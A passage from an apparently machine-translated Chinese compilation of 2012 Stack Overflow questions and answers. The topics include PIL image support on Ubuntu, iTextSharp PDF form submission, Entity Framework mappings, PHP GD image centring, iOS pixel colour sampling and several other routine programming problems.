    if(!(recorded_lastname.equals(new_recorded_lastname))){ 
    //add new_recorded_lastname to database
    break;
    }
    }
    } 
```

我只想在我的数据库中有一个姓氏。即使我使用“if(!(recorded_lastname.equals(new_recorded_lastname)))”检查此行代码，它也会一次又一次地添加相同的记录。如何控制姓氏只添加一次？

//它适用于第一条记录非常好，但是从第二条记录开始，它会一次又一次地添加一些姓氏......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:18:05.073

在我看来，您正在检查数据库中的每条记录，一旦找到不包含给定姓氏的记录，您就将记录添加到数据库中。您应该累积检查结果，如下所示：

```
boolean lastnamePresent = false;
while(cursor.moveToNext()){
    String recorded_lastname=cursor.getString(cursor.getColumnIndex("lastname"));
    if(recorded_lastname.equals(new_recorded_lastname)){ 
        lastnamePresent = true;
        break;
    }
}

if(!lastnamePresent)
    // add new_record_lastname to database 
```

虽然如果你使用 SQLite 工具来处理这种东西肯定会更好。就像将列设置为`UNIQUE`.

# ubuntu - Django 说所有图片无效，但 PIL 有效

> ID：10658516
> 
> 赞同：4
> 
> 时间：2012-05-18T19:16:21.797
> 
> 标签：ubuntu, nginx, python-imaging-library, django-models, gunicorn

我正在使用 Nginx、Gunicorn 和 Django 1.4 在 Ubuntu 12.04 上运行一个新的 Linode。上传到图像字段（在本地工作）声称文件已损坏或无效，包括在本地工作的图像。

PIL 有效。我可以加载、检查和收集图像的各种属性。

我也在使用 virtualenv。

有什么建议么？

**更多信息：**

```
--------------------------------------------------------------------
PIL 1.1.7 SETUP SUMMARY
--------------------------------------------------------------------
version       1.1.7
platform      linux2 2.7.3 (default, Apr 20 2012, 22:44:07)
              [GCC 4.6.3]
--------------------------------------------------------------------
*** TKINTER support not available
*** JPEG support not available
*** ZLIB (PNG/ZIP) support not available
*** FREETYPE2 support not available
*** LITTLECMS support not available
-------------------------------------------------------------------- 
```

这是 pip install PIL 结束时的输出。问题是，为什么没有可用的支持？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T23:01:07.390

使用以下方法解决：http: [//www.sandersnewmedia.com/why/2012/04/16/installing-pil-virtualenv-ubuntu-1204-precise-pangolin/](http://www.sandersnewmedia.com/why/2012/04/16/installing-pil-virtualenv-ubuntu-1204-precise-pangolin/)

* * *

### 出于存档目的，该帖子的副本：

以下技术应该适用于 32 位和 64 位系统。

安装构建依赖项：

`sudo apt-get build-dep python-imaging`

符号链接库：

```
sudo ln -s /usr/lib/`uname -i`-linux-gnu/libfreetype.so /usr/lib/
sudo ln -s /usr/lib/`uname -i`-linux-gnu/libjpeg.so /usr/lib/
sudo ln -s /usr/lib/`uname -i`-linux-gnu/libz.so /usr/lib/ 
```

安装：

```
pip install PIL 
```

构建完成后，您应该会看到如下内容：

```
--------------------------------------------------------------------
PIL 1.1.7 SETUP SUMMARY
--------------------------------------------------------------------
version       1.1.7
platform      linux2 2.7.3 (default, Apr 10 2012, 22:21:37)
              [GCC 4.6.3]
--------------------------------------------------------------------
--- TKINTER support available
--- JPEG support available
--- ZLIB (PNG/ZIP) support available
--- FREETYPE2 support available
*** LITTLECMS support not available
-------------------------------------------------------------------- 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-06T11:18:06.033

这是对我有用的解决方案。

1.  安装以下

    ```
    sudo apt-get install libjpeg62-dev zlib1g-dev libfreetype6-dev 
    ```

2.  转到您的虚拟环境

    ```
    cd ~/.virtualenvs/{env-name} 
    ```

3.  将库符号链接到您的环境

    *对于 32 位系统：*

    ```
    ln -s /usr/lib/i386-linux-gnu/libz.so ./lib/
    ln -s /usr/lib/i386-linux-gnu/libjpeg.so ./lib/
    ln -s /usr/lib/i386-linux-gnu/libfreetype.so ./lib/ 
    ```

    *对于 64 位系统：*

    ```
    ln -s /usr/lib/x86_64-linux-gnu/libz.so ./lib/
    ln -s /usr/lib/x86_64-linux-gnu/libjpeg.so ./lib/
    ln -s /usr/lib/x86_64-linux-gnu/libfreetype.so ./lib/ 
    ```

4.  安装 PIL（注意 - 如果已经安装，请卸载它然后重新安装）

    ```
    pip install PIL 
    ```

# c# - iTextSharp，在帖子中提交所有字段的代码

> ID：10658518
> 
> 赞同：4
> 
> 时间：2012-05-18T19:16:30.357
> 
> 标签：c#, asp.net, pdf, itextsharp, itext

我正在使用 iTextSharp，但遇到了一个我无法解决的问题。我正在加载一个现有的 PDF 表单，其中包含文本字段和复选框的混合。在将表单发送到浏览器之前，我会动态地向表单添加一个提交按钮，然后在浏览器中填写然后重新提交到服务器。我的问题是我无法让 PDF 提交回所有已填写和空白的字段。我已经确定了应该返回所有字段的代码，但我无法返回空复选框。我正处于我认为不可能的地步。使用 Acrobat Pro 创建的 PDF Acroform 执行此操作的任何人 - 而不是 LiveCycle。有关创建按钮的代码片段，请参见下文。我正在使用 iTextSharp 在 C# asp.net 4 中执行此操作。

```
 ButtonRect = MakeButtonRect(PDFFormOut, ButtonPos);
    button = new PushbuttonField(PDFFormOut.Writer, ButtonRect, "postSubmit");
    button.BackgroundColor = BaseColor.LIGHT_GRAY;
    button.BorderColor = GrayColor.BLACK;
    button.BorderWidth = 1f;
    button.BorderStyle = PdfBorderDictionary.STYLE_BEVELED;
    button.TextColor = GrayColor.GREEN;
    button.FontSize = 8f;
    button.Text = "Submit";
    button.Visibility = PushbuttonField.VISIBLE_BUT_DOES_NOT_PRINT;
    field = button.Field;
    field.Put(PdfName.TU, new PdfString("Save changes and return to the folder."));
    **field.Action = PdfAction.CreateSubmitForm(@"http://" + Application["WebSiteRoot"].ToString() + @"/SaveForm.aspx?OP=SAV", null, PdfAction.SUBMIT_HTML_FORMAT | PdfAction.SUBMIT_INCLUDE_NO_VALUE_FIELDS);**
    PDFFormOut.AddAnnotation(field, 1); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T15:41:25.097

根据 PDF 规范，*Section 12.7.5.2 - Submit-Form Action, table 237*，您正在设置第二个标志位，`IncludeNoValueFields`该位适用于文本字段，但您没有看到复选框。不幸的是，如果您查看*12.7.3.1 - 字段字典常规，表 221，*您会看到 PDF 中的每个字段都可以在其各自的字段标志中设置其第三位，这是不包括的`NoExport`位。`IncludeNoValueFields`因此，不幸的是，像这样通过 HTTP 传递名称/值对您不起作用。

但是，您可以将提交操作设置为包含`PdfAction.SUBMIT_XFDF`，这将为您提供一个包含每个字段的 XML 文件，包括未标记为导出的那些。

```
int flags = PdfAction.SUBMIT_XFDF | PdfAction.SUBMIT_INCLUDE_NO_VALUE_FIELDS;
field.Action = PdfAction.CreateSubmitForm(@"http://localhost/", null, flags); 
```

下面是一个带有两个复选框、一个单选按钮组和一个文本字段的表单的结果。

```
<?xml version="1.0" encoding="UTF-8"?>
<xfdf xmlns="http://ns.adobe.com/xfdf/" xml:space="preserve">
 <fields>
  <field name="Check Box3"><value>Off</value></field>
  <field name="Check Box4"><value>Off</value></field>
  <field name="Text7"><value/></field>
  <field name="YesOrNo"><value>Yes</value></field>
  <field name="postSubmit"/>
 </fields>
 <ids original="B8B00E1D7C7ADB119BD056BC3BD5CA9F" modified="05CBB9BE1720DA2B6FC45E071B74F7E3"/>
 </xfdf> 
```

在服务器端，您可以使用`Request.InputStream`来获取您的 XML。

另一种选择是实际上只是通过网络提交 PDF 并使用服务器端的东西来解析它：

```
int flags = PdfAction.SUBMIT_PDF; 
```

# entity-framework - EF4.3 Code First 与同一张表的多对多关系

> ID：10658533
> 
> 赞同：1
> 
> 时间：2012-05-18T19:17:57.963
> 
> 标签：entity-framework, entity-framework-4.1, ef-code-first, entity-framework-ctp5

如何使用此架构进行配置？

```
CREATE TABLE Entity
(
    Id int identity primary key,
    Name nvarchar(30)
)

CREATE TABLE Member
(
    ParentEntityId references Entity(Id),
    ChildEntityId references Entity(Id)
) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:31:43.983

像这样：

型号类：

```
public class Entity
{
    public int Id { get; set; }
    public string Name { get; set; }

    public ICollection<Entity> Parents { get; set; }
    public ICollection<Entity> Children { get; set; }
} 
```

映射：

```
modelBuilder.Entity<Entity>()
    .HasMany(e => e.Parents)
    .WithMany(e => e.Children)
    .Map(m =>
    {
        m.ToTable("Member");
        m.MapLeftKey("ParentEntityId");
        m.MapRightKey("ChildEntityId");
    }); 
```

# asp.net - 如何测试 USPS 运输

> ID：10658534
> 
> 赞同：1
> 
> 时间：2012-05-18T19:18:02.600
> 
> 标签：asp.net, shipping, nopcommerce, usps

我使用 NopCommerce 网上商店并致力于实施 USPS 运输。

我在 USPS 服务上注册并收到包含用户名、密码和测试 URL 的电子邮件。我打电话给 USPS 服务以切换到生产服务器，但他们说我需要 2 次成功测试。

当我尝试通过 NopCommerce 测试它时（我从电子邮件设置了测试 url）它说：

> USPS 错误返回：错误描述：API 授权失败。RateV3 不是此协议的有效 API 名称。

谁能帮我做整合？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:03:05.083

事情是......当您自己进行完整的实现时，这些测试服务器旨在用于测试。使用 nopcommerce 这已经完成了；）

[在http://www.nopcommerce.com/Boards/Topic.aspx?TopicID=1958](http://www.nopcommerce.com/Boards/Topic.aspx?TopicID=1958)找到的建议 是：

我假设您正在尝试通过 USPS 在电子邮件中发送的 URL 并使用他们提供的用户名/密码来测试运费。概念如下：他们发送给我们的 URL 是为了测试那些从头开始开发以整合 USPS API 的系统，然后测试集成是否按预期工作以及我们是否获得实时费率。他们发送给我们的这个 URL 用于测试服务器。由于我们只是尝试在第三方系统之上进行开发，因此该功能已经在系统中实现，我们真的不需要担心他们发送给我们的 URL（尽管使用该 URL 和一些特定的值 ' origin zipcode' 和 'destination zipcode' 你仍然可以测试它）。

**解决方案**：使用他们在电子邮件中发送给您的号码致电 USPS，并要求他们将您的帐户从测试服务器转移到生产服务器。他们应该立即执行并向您发送确认电子邮件。也就是说，你很高兴！现在再次测试.. 祝你好运。

*注意：*当你打电话给他们时，告诉他们你正在使用 nopcommerce 并且没有自己实现。

# jquery - jQuery表格显示头部，悬停时显示正文，单击时显示正文。需要很多表

> ID：10658541
> 
> 赞同：0
> 
> 时间：2012-05-18T19:18:38.600
> 
> 标签：jquery, html-table

我有这个代码工作，但希望有它，所以当我添加更多表格时，我不必继续添加所有这些部分和格式。

请参阅此处的示例：http: [//jsfiddle.net/QtMK2/120/](http://jsfiddle.net/QtMK2/120/) 我希望单击和切换功能完全按照示例中的方式执行。

我只是希望能够拥有它，这样当我添加更多表时，我不必继续为每个新表添加所有功能。

那么有没有办法做到这一点，所以它使用 (this) 变量只作用于该表？

-JQuery

```
$(document).ready(function(){   
var clicked1 = false; //Used tp keep tr from closing
var clicked2 = false; //Used to Keep tr from closing

//Table1 Hover
$('.ActiveDeMolayTableAwards1 th.AwardsDeMolayHead1') .hover(function(){
if(!clicked1) {                
 $('.ActiveDeMolayTableAwards1 tr.AwardsDeMolayBody1').toggle();         
}});
 //Table2 Hover 
$('.ActiveDeMolayTableAwards2 th.AwardsDeMolayHead2') .hover(function(){         
if(!clicked2) {         
  $('.ActiveDeMolayTableAwards2 tr.AwardsDeMolayBody2').toggle();         
}});

 //Table1 Click    
 $('.ActiveDeMolayTableAwards1 th.AwardsDeMolayHead1').click(function(){         
        if(!clicked1) {return clicked1 = true;  
                      $('.ActiveDeMolayTableAwards1 tr.AwardsDeMolayBody1').show(); }
          if(clicked1) {return clicked1 = false;  
                      $('.ActiveDeMolayTableAwards1 tr.AwardsDeMolayBody1').hide(); }
});

  //Table2 Click 
  $('.ActiveDeMolayTableAwards2 th.AwardsDeMolayHead2').click(function(){         
        if(!clicked2) {return clicked2 = true;  
                      $('.ActiveDeMolayTableAwards2 tr.AwardsDeMolayBody2').show(); }
          if(clicked2) {return clicked2 = false;  
                      $('.ActiveDeMolayTableAwards2 tr.AwardsDeMolayBody2').hide(); }
 });       

//LOAD CLOSED

$('.ActiveDeMolayTableAwards1 tr.AwardsDeMolayBody1')  .hide();

$('.ActiveDeMolayTableAwards2 tr.AwardsDeMolayBody2')  .hide();
 }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:00:02.747

使所有表格元素同一个类。并在每个范围内进行操作。这里我使用了一个“stayOn”类来跟踪“点击状态”

[http://jsfiddle.net/Et6XX/](http://jsfiddle.net/Et6XX/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:56:33.467

对不起，我的时间不多，而且是从头开始做的。但是，您不能一一指定每个表，而是将它们全部引用，然后在函数中引用 $(this) 吗？例如，制作这样的选择器：

```
$('table[class^="ActiveDeMolayTableAwards"] th[class^="AwardsDeMolayHead"]') 
```

例如，选择所有类以“ActiveDeMolayTableAwards”开头的表。

另一件事是使用 .live() 函数而不是 document.ready() 函数，因为 live() 将对动态添加的表做出反应并包括它们。

# javascript - 任何拉伸背景图像的方法

> ID：10658545
> 
> 赞同：3
> 
> 时间：2012-05-18T19:19:03.763
> 
> 标签：javascript, animation

我正在尝试创建一个类似于[此处](http://milliontrees.ca)的计数器。通过拉伸/挤压图像来计算。

但我宁愿使用精灵而不是图像作为数字。唯一的问题是我看不到使用 javascript 为背景图像拉伸设置动画的方法。我知道有 background-size css3 属性，但这不适用于 jquery animate 方法并且有点奇怪。

有没有其他方法可以做到这一点？有没有办法以某种方式使用带有图像而不是背景图像的精灵？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-22T16:53:16.763

您可以使用具有溢出=隐藏的 DIV 包装 IMG 标记，并使用位置属性移动它。这不是很好的解决方案（元素太多），但它是您所需要的。

# php - 在新的、更大的图像中居中图像资源 (PHP/imagecopy)

> ID：10658546
> 
> 赞同：1
> 
> 时间：2012-05-18T19:19:08.023
> 
> 标签：php, gd, jpeg

我正在尝试构建一个函数，该函数采用 PHP 图像资源并将其放置在预定大小的新图像的中心。我**不想**缩放图像；相反，我想将它按原样放置在放大的“画布”的中心。

`$img`是一个有效的图像资源 - 如果我返回它，我会收到正确的原始（未处理）图像。`$canvas_w`并且`$canvas_h`是所需新画布的宽度和高度。它正在创建正确大小的画布，但是当我返回所需的“已校正”图像资源 ( `$newimg`) 时，文件的内容出乎意料地是纯黑色。

```
// what file?
$file = 'smile.jpg';

// load the image
$img = imagecreatefromjpeg($file);

// resize canvas (not the source data)
$newimg = imageCorrect($img, false, 1024, 768);

// insert image
header("Content-Type: image/jpeg");
imagejpeg($newimg);
exit;

function imageCorrect($image, $background = false, $canvas_w, $canvas_h) {
    if (!$background) {
        $background = imagecolorallocate($image, 255, 255, 255);
    }
    $img_h = imagesy($image);
    $img_w = imagesx($image);

    // create new image (canvas) of proper aspect ratio
    $img = imagecreatetruecolor($canvas_w, $canvas_h);

    // fill the background
    imagefill($img, 0, 0, $background);

    // offset values (center the original image to new canvas)
    $xoffset = ($canvas_w - $img_w) / 2;
    $yoffset = ($canvas_h - $img_h) / 2;

    // copy
    imagecopy($img, $image, $xoffset, $yoffset, $canvas_w, $canvas_h, $img_w, $img_h);

    // destroy old image cursor
    //imagedestroy($image);
    return $img; // returns a black original file area properly sized/filled
    //return $image; // works to return the unprocessed file
} 
```

这里有任何提示或明显的错误吗？感谢您的任何建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-19T11:25:22.073

代替`imagecopy()`，这似乎有效：

```
imagecopymerge($img, $image, $xoffset, $yoffset, 0,0, $img_w, $img_h, 100); 
```

# ruby-on-rails - 将解析后的变量传递给不同的模型形式

> ID：10658547
> 
> 赞同：0
> 
> 时间：2012-05-18T19:19:08.577
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1

我有一个产品脚手架设置，我刚刚创建了一个新的 foo 控制器和视图。在我的 foo 控制器中，我解析了一个 url，并取回了一组对象。如何将这些变量中的每一个作为默认值传递到产品表单中？

我的控制器：

```
 require 'net/http'
  require 'json'

def index
    if params[:commit] == "Add Product"
      @productId = params[:q]
      @resultsReceived = true
      if 
          url =  URI.parse("url" + params[:q].to_s)
          @response = JSON.parse(Net::HTTP.get_response(url).body)
      end
    else
      @resultsReceived = false
      @response = []
    end

     respond_to do |format|
        format.html
      end
end
end 
```

我目前的索引

```
<%= form_tag("/foo", :method => "get") do %>
  <%= label_tag(:q, "Enter Product Number") %>
  <%= text_field_tag(:q) %>
  <%= submit_tag("Add Product") %>
<% end %>

    <% if @resultsReceived == true %>
        Title:   <%= @response["product"]["title"] %>   </br>
        ID_Str:   <%= @response["product"]["id_str"] %> </br>
        Image Url:  <%= @response["product"]["image_url"] %>    </br>
        Base Item Price:  <%= @response["product"]["base_item_price"] %>    </br>
        Current Item Price:  <%= @response["product"]["price"] %>   </br>
        Seller Name:  <%= @response["product"]["mp_seller_name"] %> </br>
        Description:    <%= @response["product"]["descr"] %>    </br>
    <% end %> 
```

我希望将上面的变量传递给我已经存在的产品。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:01:56.620

我认为您必须将其他数据的访问权限从您的索引操作转移到您的新操作或您可能创建的“new_prefilled”操作。如果属性匹配会很有帮助（您从 url 获得的内容与您的产品型号具有相同的属性名称）

IE

```
def new_prefilled

  if url =  URI.parse("url" + params[:oid].to_s)
    @response = JSON.parse(Net::HTTP.get_response(url).body)
  end
  @product = Product.new(@response['product'])
  render 'new'
end 
```

然后你必须添加一条路线，

```
get '/products/new/:oid' => 'products#new_prefilled' 
```

然后在您的索引操作中，您将执行以下操作：

```
if params[:commit] == "Add Product"
  redirect_to "/products/new/#{params[:q]}"
end 
```

So you would render your new products view, but it would be pre-filled with that data you got from the other site.

# symfony - 使用不同的 Doctrine2

> ID：10658549
> 
> 赞同：0
> 
> 时间：2012-05-18T19:19:23.757
> 
> 标签：symfony, doctrine-orm, distinct

我正在 symfony2 中开发应用程序并使用教义2。我创建了一个具有一个功能的自定义存储库类：

```
<?php

namespace Anotatzailea\AnotatzaileaBundle\Repository;

use Doctrine\ORM\EntityRepository;

/**
 * InterpretatzeaRepository
 *
 * This class was generated by the Doctrine ORM. Add your own custom
 * repository methods below.
 */
class InterpretatzeaRepository extends EntityRepository
{

    public function getInterpDesberdinak($value)
    {
          $qb = $this->createQueryBuilder('c')
              ->select('DISTINCT c.attribute')
               ->where('c.fer = :Value')
               ->setParameter('Value', $value);
          $Emaitza = $qb->getQuery()->getResult();
          return $Emaitza;
    }       

} 
```

我想用这个函数得到一个包含所有“Interpretatzea”对象的数组，这些对象具有不同的 c.attribute 并且都具有 c.fer = value。查询是否正确？我还想知道如何将 value 参数传递给存储库函数。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-19T02:43:07.000

粗略查看您的存储库方法表明它看起来不错:) IIRC，我认为使用`DISTINCT`那里很好。如果你确实有问题，你总是可以做一个`GROUP BY`。

至于在控制器中调用 repo 方法并将`$value`变量传递给它，这非常简单；例如：

```
// in your controller
$value = 'foo';

// get doctrine connection from DI, etc.
$em = $this->getDoctrine()
    ->getEntityManager();

// get the repository object for your 
// entity and call your repository method
$result = $em->getRepository('AnotatzaileaAnotatzaileaBundle:Interpretatzea')
    ->getInterpDesberdinak($value);

// ... do something with your $result here 
```

Note you use a concatenated version of your namespace and bundle, followed by a colon and the entity; e.g: `AcmeTestBundle:User`

Hope this helps :)

# java - 使用 KeyCharaters 的 If 语句

> ID：10658551
> 
> 赞同：0
> 
> 时间：2012-05-18T19:19:34.827
> 
> 标签：java, key-events

```
public static void displayInfo(KeyEvent e){
int id = e.getID();

String keyString;
   char c = e.getKeyChar();
    keyString =  ""+c;

    if (keyString=="w"){
        System.out.print("FACE");
    }
} 
```

这是我的代码，无论出于何种原因，它都不起作用。请帮忙？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:25:31.997

您不应将字符串与`==`运算符进行比较。相反，请使用该`equals`方法。所以，改变这一行：

```
if (keyString=="w"){ 
```

对此：

```
if (keyString.equals("w")){ 
```

# objective-c - 如何从在 UIimageView 中缩放的 UIimage 获取位置的像素颜色

> ID：10658553
> 
> 赞同：2
> 
> 时间：2012-05-18T19:19:39.363
> 
> 标签：objective-c, ios, pixels

我目前正在使用这种技术来获取 UIimage 中像素的颜色。（在 iOS 上）

```
- (UIColor*) getPixelColorAtLocation:(CGPoint)point {
UIColor* color = nil;
CGImageRef inImage = self.image.CGImage;
// Create off screen bitmap context to draw the image into. Format ARGB is 4 bytes for each pixel: Alpa, Red, Green, Blue
CGContextRef cgctx = [self createARGBBitmapContextFromImage:inImage];
if (cgctx == NULL) { return nil; /* error */ }

size_t w = CGImageGetWidth(inImage);
size_t h = CGImageGetHeight(inImage);
CGRect rect = {{0,0},{w,h}}; 

// Draw the image to the bitmap context. Once we draw, the memory 
// allocated for the context for rendering will then contain the 
// raw image data in the specified color space.
CGContextDrawImage(cgctx, rect, inImage); 

// Now we can get a pointer to the image data associated with the bitmap
// context.
unsigned char* data = CGBitmapContextGetData (cgctx);
if (data != NULL) {
    //offset locates the pixel in the data from x,y. 
    //4 for 4 bytes of data per pixel, w is width of one row of data.
    int offset = 4*((w*round(point.y))+round(point.x));
    int alpha =  data[offset]; 
    int red = data[offset+1]; 
    int green = data[offset+2]; 
    int blue = data[offset+3]; 
    NSLog(@"offset: %i colors: RGB A %i %i %i  %i",offset,red,green,blue,alpha);
    color = [UIColor colorWithRed:(red/255.0f) green:(green/255.0f) blue:(blue/255.0f) alpha:(alpha/255.0f)];
}

// When finished, release the context
CGContextRelease(cgctx); 
// Free image data memory for the context
if (data) { free(data); }
return color; 
```

}

如此处所示；

[http://www.markj.net/iphone-uiimage-pixel-color/](http://www.markj.net/iphone-uiimage-pixel-color/)

它工作得很好，但是当处理大于 UIImageView 的图像时它会失败。我尝试添加图像并更改缩放模式以适合视图。我将如何修改代码以使其仍然能够使用缩放图像对像素颜色进行采样。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-06-22T10:30:12.277

**试试这个 swift3**

```
func getPixelColor(image: UIImage, x: Int, y: Int, width: CGFloat) -> UIColor 
{

    let pixelData = CGDataProviderCopyData(CGImageGetDataProvider(image.CGImage))
    let data: UnsafePointer<UInt8> = CFDataGetBytePtr(pixelData)

    let pixelInfo: Int = ((Int(width) * y) + x) * 4

    let r = CGFloat(data[pixelInfo]) / CGFloat(255.0)
    let g = CGFloat(data[pixelInfo+1]) / CGFloat(255.0)
    let b = CGFloat(data[pixelInfo+2]) / CGFloat(255.0)
    let a = CGFloat(data[pixelInfo+3]) / CGFloat(255.0)

    return UIColor(red: r, green: g, blue: b, alpha: a)
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T09:40:33.673

这是一个指针：

```
0x3A28213A //sorry, I couldn't resist the joke 
```

* * *

现在是真实的：在浏览了 markj.net 页面上的评论后，某位 James 建议进行以下更改：

```
size_t w = CGImageGetWidth(inImage); //Written by Mark
size_t h = CGImageGetHeight(inImage); //Written by Mark
float xscale = w / self.frame.size.width;
float yscale = h / self.frame.size.height;
point.x = point.x * xscale;
point.y = point.y * yscale; 
```

（感谢[http://www.markj.net/iphone-uiimage-pixel-color/comment-page-1/#comment-2159](http://www.markj.net/iphone-uiimage-pixel-color/comment-page-1/#comment-2159)）

这实际上对我不起作用......并不是说我做了很多测试，而且我还不是世界上最伟大的程序员......

**我的解决方案**是以这样一种方式缩放`UIImageView`图像，使图像中的每个像素与屏幕上的标准 CGPoint 大小相同，然后我像正常一样（使用`getPixelColorAtLocation:(CGPoint)point`）取我的颜色，然后我将图像缩放回大小我想了。

希望这可以帮助！

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-30T10:07:11.413

使用 UIImageView 层：

```
- (UIColor*) getPixelColorAtLocation:(CGPoint)point {
    UIColor* color = nil;

    UIGraphicsBeginImageContext(self.frame.size);
    CGContextRef cgctx = UIGraphicsGetCurrentContext();
    if (cgctx == NULL) { return nil; /* error */ }

    [self.layer renderInContext:cgctx];

    unsigned char* data = CGBitmapContextGetData (cgctx);
    /*
    ...
    */
    UIGraphicsEndImageContext();
    return color;
} 
```

# php - 如何在保持计数的同时从数组中删除重复值？

> ID：10658555
> 
> 赞同：1
> 
> 时间：2012-05-18T19:19:45.643
> 
> 标签：php, arrays, loops

我们有一个填充了类别名称的数组（其中许多是重复的），我们需要构建一个二维数组，以消除数组一侧的重复，并且在数组的另一侧有多少次的总数类别名称出现在原始数组中。这里有两张图片，以便您更好地理解我所描述的内容：http: [//postimage.org/image/ptms64cl9/](http://postimage.org/image/ptms64cl9/)和[http://postimage.org/image/70x6qt0l9/](http://postimage.org/image/70x6qt0l9/)。现在，我确信有不止一种方法可以做到这一点，但我想了解这本书是如何做到的。这是代码，请注意 $mismatch_categories 包含重复类别的原始数组：

```
 $category_totals = array(array($mismatch_categories[0], 0));
    foreach ($mismatch_categories as $category) {
      if ($category_totals[count($category_totals) - 1][0] != $category) {
        array_push($category_totals, array($category, 1));
      }
      else {
        $category_totals[count($category_totals) - 1][1]++;
      }
    } 
```

关于此示例，我不了解的主要内容之一是数组中的数组。这里实际上没有 3 个数组：

```
 $category_totals = array(array($mismatch_categories[0], 0)); 
```

如果有 3 个数组，我如何使用它们的索引？可能是这样的？：

```
 $category_totals[0][0][0]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T21:10:08.723

检查 array_count_values() 函数（[http://www.php.net/manual/pl/function.array-count-values.php](http://www.php.net/manual/pl/function.array-count-values.php)）应该可以解决问题

源数组：

```
array(
    0 => 'Cat 1',
    1 => 'Cat 1',
    2 => 'Cat 1',
    3 => 'Cat 2',
    4 => 'Cat 2',
    5 => 'Cat 3',
    6 => 'Cat 4',
) 
```

结果数组_count_values()：

```
array(
    'Cat 1' => 3,
    'Cat 2' => 2,
    'Cat 3' => 1,
    'Cat 4' => 1,
) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:58:27.927

希望它能帮助你理解。

```
<?php
     echo '<pre>';
     $mismatch_categories = array('cat', 'cat', 'cow', 'book', 'box', 'box', 'box');
     echo 'Input Mismatch Category::<br />';
     print_r($mismatch_categories);
     echo '<br />';
     $category_totals = array(array($mismatch_categories[0], 0));
     echo 'categroy totals that holds final data' . '<br />';
     $counter = 0;
     print_r($category_totals);
     foreach ($mismatch_categories as $category) {
         echo 'Iteration ' . $counter++ . '<br /><br />';
         echo 'Current category value::' . $category . "<br /><br />";
         echo 'Value of category_totals[' . count($category_totals) . '- 1][0] :: ' .         $category_totals[count($category_totals) - 1][0] . '<br/><br />';
         echo 'Are they equal' . '<br />';
         if ($category_totals[count($category_totals) - 1][0] != $category) {
              echo 'Not matched so pushed into array with occurence of one<br />';
              array_push($category_totals, array($category, 1));
         } else {
              echo 'matches so count is increased by 1' . "<br />";
              $category_totals[count($category_totals) - 1][1]++;
         }
         echo 'category totals:' . '<br />';
         print_r($category_totals);
   }
   echo 'Final value of category_totals::';
   print_r($category_totals);
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-19T07:49:33.360

跟进评论中的建议：

```
<?php
$mismatch_categories = array('cat', 'cat', 'cow', 'book', 'box', 'box', 'box');

$cat_counts = array_count_values($mismatch_categories);
// = array('cat' => 2, 'cow' => 1, 'book' => 1, 'box' => 3)

$categories = array_unique($mismatch_categories);
// = array('cat', 'cow', 'book', 'box');
?> 
```

换句话说，正是您正在寻找的东西。

在这里编写自己的处理循环的唯一原因是编码练习。

# android - ContentProvider 和 ContentResolver 类中 query() 的区别

> ID：10658557
> 
> 赞同：1
> 
> 时间：2012-05-18T19:19:53.467
> 
> 标签：android, android-activity, android-contentprovider, android-context, android-contentresolver

我是安卓新手。现在我正在做内容提供者。我正在关注“Pro android 3”一书。从那里我已经实现了这个`BookProvider`例子。我已经在扩展类的类中实现了`insert,update,delete`函数。但是在使用这些函数时，我使用了：`BookProvider``ContentProvider`

```
ContentResolver cr = context.getContentResolver();
cr.delete(uri,contentValues); 
```

我的疑问是我在课堂上编写的方法以何种方式与`BookProvider`课堂沟通`ContentResolver`......

也有人请举例说明和类之间的基本定义`Context`、区别和关系`ContentProvider``ContentResolver`

另一个疑问是，在某些示例中，他们已将上下文对象显式转换为 Activity 对象…… Activity 和 Context 类是如何相关的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:23:25.337

A`Context`包含有关运行或的上下文`Activity`的信息。所有这些类都直接或间接继承自. 因此，所有ies 都是 ies ，但只有一些s 是ies`Service``BroadcastReceiver``Context``Activity``Context``Context``Activity`

当您定义 a 时，`ContentProvider`您为它可以处理的元素指定一个或多个基本 uri。工作是根据您提供的 uri`ContentResolver`将您的命令发送到 a 。`ContentProvider`

# ruby-on-rails - Ruby on Rails 的性能指标 gem

> ID：10658560
> 
> 赞同：1
> 
> 时间：2012-05-18T19:20:02.983
> 
> 标签：ruby-on-rails, gem, activeadmin

我正在寻找有助于监控平台性能的 Rails 宝石。它需要能够监控平台的关键性能指标。比如每天获得的用户数量，离开平台的用户数量。我发现[Sevos](https://github.com/sevos/kpi)的库看起来很不错，但它让我想知道是否还有其他工具可以轻松地与 active_admin 集成。以更图形化的方式显示平台的性能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:49:12.320

我认为[http://www.newrelic.com](http://www.newrelic.com)对你来说可能很有趣。我还没有测试过它，但它看起来很有希望，而且我从其他一些人那里听说他们将它用于他们的应用程序。[你可以在https://github.com/newrelic/rpm](https://github.com/newrelic/rpm)上找到 ruby​​ 代理

# git - 如何在 Xcode Workspace 中使用多个项目配置 GIT 存储库

> ID：10658562
> 
> 赞同：5
> 
> 时间：2012-05-18T19:20:14.250
> 
> 标签：git, xcode4, workspace

这更多的是关于什么是正确策略的问题，而不是“如何”，因为我已经有了 GIT 手册。

我有一个 Xcode 工作区。它包含3个子项目。

